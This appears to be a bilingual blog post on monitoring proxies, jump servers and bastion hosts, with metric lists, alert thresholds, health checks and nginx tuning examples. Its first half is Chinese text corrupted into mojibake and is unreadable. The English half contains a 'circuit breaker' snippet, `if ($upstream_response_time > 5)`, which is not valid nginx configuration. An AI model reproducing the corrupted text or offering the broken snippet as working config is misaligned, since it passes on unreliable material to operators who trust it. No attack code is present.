ğŸ›¡ï¸ å®‰å…¨å‹ä»£ç†çš„ç›‘æ§ç—›ç‚¹ï¼š
- å®‰å…¨äº‹ä»¶è¯†åˆ«ï¼šå¦‚ä½•ä»æµ·é‡æ—¥å¿—ä¸­è¯†åˆ«çœŸæ­£çš„å®‰å…¨å¨èƒï¼Ÿ
- åˆè§„å®¡è®¡è¦æ±‚ï¼šéœ€è¦ä¿è¯å®¡è®¡æ—¥å¿—çš„å®Œæ•´æ€§å’Œä¸å¯ç¯¡æ”¹æ€§
- è¯¯æŠ¥ä¸æ¼æŠ¥ï¼šè®¿é—®æ§åˆ¶è§„åˆ™è¿‡ä¸¥å¯¼è‡´è¯¯æŠ¥ï¼Œè¿‡æ¾å¯¼è‡´æ¼æŠ¥

ğŸšª è·³æ¿æœºçš„ç›‘æ§ç—›ç‚¹ï¼š
- ä¼šè¯ç®¡ç†å¤æ‚ï¼šå¤šä¸ªç”¨æˆ·åŒæ—¶é€šè¿‡è·³æ¿æœºè®¿é—®ä¸åŒæœåŠ¡å™¨ï¼Œä¼šè¯è¿½è¸ªå›°éš¾
- ç½‘ç»œé“¾è·¯ç›‘æ§ï¼šéœ€è¦ç›‘æ§è·³æ¿æœºåˆ°å„ä¸ªç›®æ ‡æœåŠ¡å™¨çš„ç½‘ç»œè¿é€šæ€§
- èµ„æºä½¿ç”¨é¢„æµ‹ï¼šéš¾ä»¥é¢„æµ‹è·³æ¿æœºçš„èµ„æºéœ€æ±‚ï¼Œå®¹æ˜“å‡ºç°èµ„æºä¸è¶³

ğŸ° å ¡å’æœºçš„ç›‘æ§ç—›ç‚¹ï¼š
- å¤šç»´åº¦æƒé™ç›‘æ§ï¼šç”¨æˆ·-ä¸»æœº-å‘½ä»¤ä¸‰çº§æƒé™çš„ç›‘æ§å’Œå®¡è®¡
- å¤§æ•°æ®é‡å¤„ç†ï¼šæ“ä½œå½•å±ã€å‘½ä»¤æ—¥å¿—äº§ç”Ÿæµ·é‡æ•°æ®ï¼Œå­˜å‚¨å’Œåˆ†æå‹åŠ›å¤§
- é›†æˆç³»ç»Ÿç›‘æ§ï¼šéœ€è¦ç›‘æ§ä¸AD/LDAPç­‰å¤–éƒ¨ç³»ç»Ÿçš„é›†æˆçŠ¶æ€

4ï¸âƒ£ SREçš„"é€è§†é•œ"ï¼šåˆ†ç±»ç›‘æ§ä¸åŒè§’è‰²çš„ä»£ç† ğŸ”

ğŸ¢ ä¸­ä»‹å‹ä»£ç†ç›‘æ§ï¼šå…³æ³¨æ€§èƒ½å’Œå¯ç”¨æ€§

```bash
# ååé‡æŒ‡æ ‡
proxy_requests_per_second          # æ¯ç§’å¤„ç†è¯·æ±‚æ•°
proxy_concurrent_connections       # å¹¶å‘è¿æ¥æ•°
proxy_bandwidth_usage             # å¸¦å®½ä½¿ç”¨æƒ…å†µ

# å»¶è¿ŸæŒ‡æ ‡
proxy_response_time_p95           # 95åˆ†ä½å“åº”æ—¶é—´
proxy_upstream_response_time      # åç«¯å“åº”æ—¶é—´
proxy_processing_time             # ä»£ç†è‡ªèº«å¤„ç†æ—¶é—´

# é”™è¯¯ç‡æŒ‡æ ‡
proxy_error_rate                  # æ€»ä½“é”™è¯¯ç‡
proxy_upstream_errors             # åç«¯æœåŠ¡é”™è¯¯
proxy_timeout_errors              # è¶…æ—¶é”™è¯¯
proxy_connection_errors           # è¿æ¥é”™è¯¯

# ç¼“å­˜æŒ‡æ ‡ï¼ˆå¦‚æœæœ‰ç¼“å­˜åŠŸèƒ½ï¼‰
proxy_cache_hit_rate              # ç¼“å­˜å‘½ä¸­ç‡
proxy_cache_size                  # ç¼“å­˜ä½¿ç”¨å¤§å°
proxy_cache_evictions             # ç¼“å­˜æ·˜æ±°æ¬¡æ•°
```

ğŸ›¡ï¸ å®‰å…¨å‹ä»£ç†ç›‘æ§ï¼šå…³æ³¨å®‰å…¨å’Œåˆè§„

```bash
# å®‰å…¨æŒ‡æ ‡
security_blocked_requests         # è¢«é˜»æ­¢çš„æ¶æ„è¯·æ±‚æ•°
security_policy_violations        # å®‰å…¨ç­–ç•¥è¿è§„æ¬¡æ•°
authentication_failures           # è®¤è¯å¤±è´¥æ¬¡æ•°
authorization_denials             # æˆæƒæ‹’ç»æ¬¡æ•°

# å®¡è®¡æŒ‡æ ‡
audit_log_volume                  # å®¡è®¡æ—¥å¿—äº§ç”Ÿé‡
audit_log_integrity              # å®¡è®¡æ—¥å¿—å®Œæ•´æ€§æ£€æŸ¥
compliance_report_generation      # åˆè§„æŠ¥å‘Šç”ŸæˆçŠ¶æ€
```

ğŸšª è·³æ¿æœºç›‘æ§ï¼šå…³æ³¨è¿æ¥å’Œä¼šè¯

```bash
# ä¼šè¯æŒ‡æ ‡
jumpserver_active_sessions        # æ´»è·ƒä¼šè¯æ•°
jumpserver_session_duration       # ä¼šè¯æŒç»­æ—¶é—´
jumpserver_concurrent_users       # å¹¶å‘ç”¨æˆ·æ•°
jumpserver_connection_success_rate # è¿æ¥æˆåŠŸç‡

# ç½‘ç»œæŒ‡æ ‡
jumpserver_network_latency        # åˆ°ç›®æ ‡æœåŠ¡å™¨çš„ç½‘ç»œå»¶è¿Ÿ
jumpserver_ssh_tunnel_status      # SSHéš§é“çŠ¶æ€
jumpserver_bandwidth_usage        # å¸¦å®½ä½¿ç”¨æƒ…å†µ
```

ğŸ° å ¡å’æœºç›‘æ§ï¼šå…³æ³¨æƒé™å’Œå®¡è®¡

```bash
# æƒé™ç®¡ç†æŒ‡æ ‡
bastion_user_login_count          # ç”¨æˆ·ç™»å½•æ¬¡æ•°
bastion_permission_changes        # æƒé™å˜æ›´æ¬¡æ•°
bastion_policy_violations         # ç­–ç•¥è¿è§„æ¬¡æ•°
bastion_privilege_escalations     # æƒé™æå‡æ¬¡æ•°

# å®¡è®¡æŒ‡æ ‡
bastion_command_executions        # å‘½ä»¤æ‰§è¡Œæ¬¡æ•°
bastion_file_transfers           # æ–‡ä»¶ä¼ è¾“æ¬¡æ•°
bastion_screen_recording_size     # å½•å±æ–‡ä»¶å¤§å°
bastion_audit_export_requests     # å®¡è®¡å¯¼å‡ºè¯·æ±‚æ•°

# é›†æˆç³»ç»ŸæŒ‡æ ‡
bastion_ldap_sync_status          # LDAPåŒæ­¥çŠ¶æ€
bastion_ad_integration_health     # ADé›†æˆå¥åº·çŠ¶æ€
bastion_sso_authentication_rate   # SSOè®¤è¯æˆåŠŸç‡
```

å¥åº·æ£€æŸ¥ç­–ç•¥ï¼šä»£ç†çš„"ä½“æ£€æŠ¥å‘Š"

```bash
# ä»£ç†è‡ªèº«å¥åº·æ£€æŸ¥
GET /health/proxy
- æ£€æŸ¥ä»£ç†æœåŠ¡çŠ¶æ€
- éªŒè¯é…ç½®æ–‡ä»¶æ­£ç¡®æ€§
- ç›‘æ§èµ„æºä½¿ç”¨æƒ…å†µ

# åç«¯æœåŠ¡å¥åº·æ£€æŸ¥
GET /health/upstream
- å®šæœŸæ£€æŸ¥åç«¯æœåŠ¡å¯ç”¨æ€§
- è‡ªåŠ¨æ‘˜é™¤ä¸å¥åº·çš„åç«¯
- æœåŠ¡æ¢å¤åè‡ªåŠ¨åŠ å›

# ç«¯åˆ°ç«¯å¥åº·æ£€æŸ¥
GET /health/e2e
- æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¯·æ±‚
- éªŒè¯å®Œæ•´é“¾è·¯å¯ç”¨æ€§
- æ£€æµ‹ç¼“å­˜æ˜¯å¦æ­£å¸¸å·¥ä½œ
```

å‘Šè­¦è§„åˆ™è®¾ç½®ï¼šä»£ç†çš„"æŠ¥è­¦å™¨"

```bash
# é«˜ä¼˜å…ˆçº§å‘Šè­¦
- ä»£ç†æœåŠ¡ä¸å¯ç”¨ï¼ˆç«‹å³å‘Šè­¦ï¼‰
- é”™è¯¯ç‡è¶…è¿‡5%ï¼ˆ5åˆ†é’Ÿå†…ï¼‰
- å“åº”æ—¶é—´P95è¶…è¿‡2ç§’ï¼ˆè¿ç»­3åˆ†é’Ÿï¼‰
- æ‰€æœ‰åç«¯æœåŠ¡ä¸å¯ç”¨ï¼ˆç«‹å³å‘Šè­¦ï¼‰

# ä¸­ä¼˜å…ˆçº§å‘Šè­¦
- ç¼“å­˜å‘½ä¸­ç‡ä½äº80%ï¼ˆ15åˆ†é’Ÿå†…ï¼‰
- è¿æ¥æ± ä½¿ç”¨ç‡è¶…è¿‡80%ï¼ˆ10åˆ†é’Ÿå†…ï¼‰
- å•ä¸ªåç«¯æœåŠ¡ä¸å¯ç”¨ï¼ˆ5åˆ†é’Ÿå†…ï¼‰

# ä½ä¼˜å…ˆçº§å‘Šè­¦
- å¸¦å®½ä½¿ç”¨ç‡è¶…è¿‡70%ï¼ˆ30åˆ†é’Ÿå†…ï¼‰
- å†…å­˜ä½¿ç”¨ç‡è¶…è¿‡85%ï¼ˆ20åˆ†é’Ÿå†…ï¼‰
```

5ï¸âƒ£ ä»£ç†ä¼˜åŒ–çš„"æ­¦åŠŸç§˜ç±" ğŸ¥‹

æ€§èƒ½è°ƒä¼˜ï¼šè®©ä¸­é—´å•†æ›´é«˜æ•ˆ

```bash
# è¿æ¥æ± ä¼˜åŒ–
upstream backend {
    server backend1.example.com max_conns=100;
    server backend2.example.com max_conns=100;
    keepalive 32;  # ä¿æŒè¿æ¥æ± 
}

# ç¼“å­˜ç­–ç•¥ä¼˜åŒ–
location /api/ {
    proxy_cache my_cache;
    proxy_cache_valid 200 5m;      # æˆåŠŸå“åº”ç¼“å­˜5åˆ†é’Ÿ
    proxy_cache_valid 404 1m;      # 404é”™è¯¯ç¼“å­˜1åˆ†é’Ÿ
    proxy_cache_use_stale error timeout; # åç«¯é”™è¯¯æ—¶ä½¿ç”¨è¿‡æœŸç¼“å­˜
}

# è´Ÿè½½å‡è¡¡ç®—æ³•é€‰æ‹©
upstream backend {
    least_conn;  # æœ€å°‘è¿æ¥æ•°ç®—æ³•
    # ip_hash;   # IPå“ˆå¸Œç®—æ³•
    # random;    # éšæœºç®—æ³•
}
```

æ•…éšœå¤„ç†ï¼šä¸­é—´å•†çš„"åº”æ€¥é¢„æ¡ˆ"

```bash
# ç†”æ–­æœºåˆ¶
if ($upstream_response_time > 5) {
    return 503 "Service temporarily unavailable";
}

# é‡è¯•ç­–ç•¥
proxy_next_upstream error timeout http_502 http_503;
proxy_next_upstream_tries 3;
proxy_next_upstream_timeout 10s;

# é™çº§ç­–ç•¥
location /api/search {
    try_files $uri @fallback;
}

location @fallback {
    return 200 '{"results": [], "message": "Search temporarily unavailable"}';
}
```

6ï¸âƒ£ å®æˆ˜ç»éªŒï¼šä»£ç†çš„"è¸©å‘æŒ‡å—" âš ï¸

å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆï¼š

é—®é¢˜1ï¼šä»£ç†æˆä¸ºæ€§èƒ½ç“¶é¢ˆ
- ç°è±¡ï¼šåç«¯æœåŠ¡æ­£å¸¸ï¼Œä½†æ•´ä½“å“åº”æ…¢
- æ’æŸ¥ï¼šæ£€æŸ¥ä»£ç†CPUã€å†…å­˜ã€ç½‘ç»œä½¿ç”¨ç‡
- è§£å†³ï¼šå¢åŠ ä»£ç†å®ä¾‹ï¼Œä¼˜åŒ–é…ç½®å‚æ•°

é—®é¢˜2ï¼šç¼“å­˜ç­–ç•¥ä¸å½“
- ç°è±¡ï¼šç”¨æˆ·çœ‹åˆ°è¿‡æœŸæ•°æ®æˆ–ç¼“å­˜å‘½ä¸­ç‡ä½
- æ’æŸ¥ï¼šåˆ†æç¼“å­˜é”®è®¾è®¡å’Œè¿‡æœŸç­–ç•¥
- è§£å†³ï¼šè°ƒæ•´ç¼“å­˜æ—¶é—´ï¼Œä¼˜åŒ–ç¼“å­˜é”®è§„åˆ™

é—®é¢˜3ï¼šå¥åº·æ£€æŸ¥è¯¯åˆ¤
- ç°è±¡ï¼šæ­£å¸¸æœåŠ¡è¢«è¯¯åˆ¤ä¸ºä¸å¥åº·
- æ’æŸ¥ï¼šæ£€æŸ¥å¥åº·æ£€æŸ¥æ¥å£å’Œåˆ¤æ–­é€»è¾‘
- è§£å†³ï¼šè°ƒæ•´æ£€æŸ¥é¢‘ç‡å’Œå¤±è´¥é˜ˆå€¼

ç›‘æ§ä»ªè¡¨ç›˜è®¾è®¡ï¼šä»£ç†çš„"é©¾é©¶èˆ±"

```bash
# æ ¸å¿ƒæŒ‡æ ‡é¢æ¿
- è¯·æ±‚é‡è¶‹åŠ¿å›¾ï¼ˆQPSï¼‰
- å“åº”æ—¶é—´åˆ†å¸ƒå›¾ï¼ˆP50/P95/P99ï¼‰
- é”™è¯¯ç‡è¶‹åŠ¿å›¾
- åç«¯æœåŠ¡å¥åº·çŠ¶æ€

# æ€§èƒ½åˆ†æé¢æ¿
- ä»£ç†å¤„ç†æ—¶é—´ vs åç«¯å“åº”æ—¶é—´
- ç¼“å­˜å‘½ä¸­ç‡è¶‹åŠ¿
- è¿æ¥æ± ä½¿ç”¨æƒ…å†µ
- å¸¦å®½ä½¿ç”¨è¶‹åŠ¿

# å‘Šè­¦é¢æ¿
- å½“å‰æ´»è·ƒå‘Šè­¦åˆ—è¡¨
- å‘Šè­¦è¶‹åŠ¿ç»Ÿè®¡
- æ•…éšœæ¢å¤æ—¶é—´ç»Ÿè®¡
```

ä¸€å¥è¯æ€»ç»“

ä»£ç†å°±åƒç½‘ç»œä¸–ç•Œçš„"å¤šé¢æ‰‹æ¼”å‘˜"ï¼Œæ—¶è€Œæ˜¯æµé‡åˆ†å‘çš„"æˆ¿äº§ä¸­ä»‹"ï¼Œæ—¶è€Œæ˜¯å®‰å…¨é˜²æŠ¤çš„"é—¨å«å¤§å”"ï¼Œæ—¶è€Œæ˜¯ç½‘ç»œè·³è½¬çš„"æ‘†æ¸¡èˆ¹å¤«"ï¼Œæ—¶è€Œæ˜¯æƒé™ç®¡æ§çš„"åŸå ¡å®ˆå«"ã€‚SREçš„ä»»åŠ¡å°±æ˜¯ç»™è¿™ä½"æ¼”å‘˜"è£…ä¸Š"é€è§†çœ¼"å’Œ"æŠ¥è­¦å™¨"ï¼Œæ— è®ºå®ƒæ‰®æ¼”ä»€ä¹ˆè§’è‰²ï¼Œä»»ä½•"æ¼”ç ¸"çš„æƒ…å†µéƒ½é€ƒä¸è¿‡æˆ‘ä»¬çš„æ³•çœ¼ï¼è®°ä½ï¼šå¥½çš„ä»£ç†æ˜¯å¤šæ‰å¤šè‰ºçš„ï¼Œä½†å¥½çš„ç›‘æ§æ˜¯å…¨æ–¹ä½çš„ï¼

----- English
Proxy: The "Middleman" of the Network World and SRE's "X-Ray Vision" ğŸ•µï¸

Hello everyone! Today let's talk about Proxy, the "universal intermediary" of the network world, and how SRE professionals act as "regulators" in this game of "middlemen making profits"!

1ï¸âƒ£ Why Do We Need Proxies? The Business of Network "Brokers" ğŸ¤

From a Development Perspective: Traffic "Agents"
Imagine proxies as real estate agents in the network world. When you want to buy a house (access a service), you don't go directly to the landlord (target server), but through an agent (proxy server). The agent knows the market, understands which properties are good, and can even help you negotiate better deals!

Core Value of Proxies:
- Load Balancing: Distributing requests among multiple backend services, like agents assigning clients to different sales representatives
- Caching Acceleration: Storing frequently used responses for immediate return, like agents remembering popular property information
- Security Protection: Filtering malicious requests, like agents screening reliable buyers for you
- Protocol Conversion: HTTP to HTTPS, like agents helping you translate foreign languages

Real-world Applications:
- Reverse Proxy: Nginx, HAProxy receiving frontend requests and distributing to backend services
- Forward Proxy: Company internet access through proxy servers for content filtering and logging
- API Gateway: Kong, Zuul serving as unified entry points for microservices
- CDN: Globally distributed cache proxies for user proximity access

2ï¸âƒ£ Proxy "Crash Scenarios": When Middlemen Go Wrong ğŸ’¥

Common Development "Pitfalls":

Single Point of Failure - "The Agent Disappeared":
When the proxy server crashes, all requests cannot be forwarded, causing complete system paralysis

Performance Bottleneck - "Agent Too Busy, Queue to Death":
Insufficient proxy processing capacity becomes system bottleneck, causing response time explosion

Configuration Errors - "Agent Got the Wrong Address":
Incorrect routing rules cause requests to be forwarded to wrong backend services

Cache Issues - "Agent Gave Expired Information":
Improper caching strategies result in users seeing outdated data

Connection Pool Exhaustion - "Agent Ran Out of Phone Lines":
Backend connection limits reached, new requests get rejected

3ï¸âƒ£ SRE Monitoring "Pain Points":

Transparency Issues:
- Proxies hide the real network topology
- Problem diagnosis requires crossing multiple layers
- End-to-end link tracing becomes complex

Performance Attribution Difficulties:
- Is latency increase from proxy itself or backend services?
- Are errors at proxy layer or application layer?
- What's the actual performance impact of cache hit rates?

4ï¸âƒ£ SRE's "X-Ray Vision": How to Monitor Proxy Services ğŸ”

Core Metrics Monitoring: Proxy "Vital Signs"

```bash
# Throughput Metrics
proxy_requests_per_second          # Requests processed per second
proxy_concurrent_connections       # Concurrent connections
proxy_bandwidth_usage             # Bandwidth utilization

# Latency Metrics
proxy_response_time_p95           # 95th percentile response time
proxy_upstream_response_time      # Backend response time
proxy_processing_time             # Proxy self-processing time

# Error Rate Metrics
proxy_error_rate                  # Overall error rate
proxy_upstream_errors             # Backend service errors
proxy_timeout_errors              # Timeout errors
proxy_connection_errors           # Connection errors

# Cache Metrics (if caching enabled)
proxy_cache_hit_rate              # Cache hit rate
proxy_cache_size                  # Cache usage size
proxy_cache_evictions             # Cache eviction count
```

Health Check Strategies: Proxy "Medical Reports"

```bash
# Proxy Self Health Check
GET /health/proxy
- Check proxy service status
- Verify configuration file correctness
- Monitor resource utilization

# Backend Service Health Check
GET /health/upstream
- Regularly check backend service availability
- Automatically remove unhealthy backends
- Auto-add back when services recover

# End-to-End Health Check
GET /health/e2e
- Simulate real user requests
- Verify complete link availability
- Check if caching works properly
```

Alert Rule Configuration: Proxy "Alarm System"

```bash
# High Priority Alerts
- Proxy service unavailable (immediate alert)
- Error rate exceeds 5% (within 5 minutes)
- P95 response time exceeds 2 seconds (continuous 3 minutes)
- All backend services unavailable (immediate alert)

# Medium Priority Alerts
- Cache hit rate below 80% (within 15 minutes)
- Connection pool usage exceeds 80% (within 10 minutes)
- Single backend service unavailable (within 5 minutes)

# Low Priority Alerts
- Bandwidth usage exceeds 70% (within 30 minutes)
- Memory usage exceeds 85% (within 20 minutes)
```

5ï¸âƒ£ Proxy Optimization "Martial Arts Secrets" ğŸ¥‹

Performance Tuning: Making Middlemen More Efficient

```bash
# Connection Pool Optimization
upstream backend {
    server backend1.example.com max_conns=100;
    server backend2.example.com max_conns=100;
    keepalive 32;  # Maintain connection pool
}

# Cache Strategy Optimization
location /api/ {
    proxy_cache my_cache;
    proxy_cache_valid 200 5m;      # Cache successful responses for 5 minutes
    proxy_cache_valid 404 1m;      # Cache 404 errors for 1 minute
    proxy_cache_use_stale error timeout; # Use stale cache when backend errors
}

# Load Balancing Algorithm Selection
upstream backend {
    least_conn;  # Least connections algorithm
    # ip_hash;   # IP hash algorithm
    # random;    # Random algorithm
}
```

Failure Handling: Middleman "Emergency Plans"

```bash
# Circuit Breaker Mechanism
if ($upstream_response_time > 5) {
    return 503 "Service temporarily unavailable";
}

# Retry Strategy
proxy_next_upstream error timeout http_502 http_503;
proxy_next_upstream_tries 3;
proxy_next_upstream_timeout 10s;

# Degradation Strategy
location /api/search {
    try_files $uri @fallback;
}

location @fallback {
    return 200 '{"results": [], "message": "Search temporarily unavailable"}';
}
```

6ï¸âƒ£ Practical Experience: Proxy "Pitfall Guide" âš ï¸

Common Issues and Solutions:

Issue 1: Proxy Becomes Performance Bottleneck
- Symptoms: Backend services normal but overall response slow
- Investigation: Check proxy CPU, memory, network utilization
- Solution: Add proxy instances, optimize configuration parameters

Issue 2: Improper Caching Strategy
- Symptoms: Users see expired data or low cache hit rates
- Investigation: Analyze cache key design and expiration policies
- Solution: Adjust cache duration, optimize cache key rules

Issue 3: Health Check False Positives
- Symptoms: Normal services incorrectly judged as unhealthy
- Investigation: Check health check endpoints and judgment logic
- Solution: Adjust check frequency and failure thresholds

Monitoring Dashboard Design: Proxy "Cockpit"

```bash
# Core Metrics Panel
- Request volume trend chart (QPS)
- Response time distribution chart (P50/P95/P99)
- Error rate trend chart
- Backend service health status

# Performance Analysis Panel
- Proxy processing time vs backend response time
- Cache hit rate trends
- Connection pool utilization
- Bandwidth usage trends

# Alert Panel
- Current active alert list
- Alert trend statistics
- Failure recovery time statistics
```

Summary

Proxies are like the "universal butlers" of the network world - they must serve as traffic distribution "dispatchers," cache optimization "warehouse managers," and security protection "security guards." The SRE's job is to equip these "butlers" with "X-ray vision" and "alarm systems," ensuring that while they serve silently, no disturbance escapes our watchful eyes! Remember: Good proxies are invisible, but good monitoring is transparent!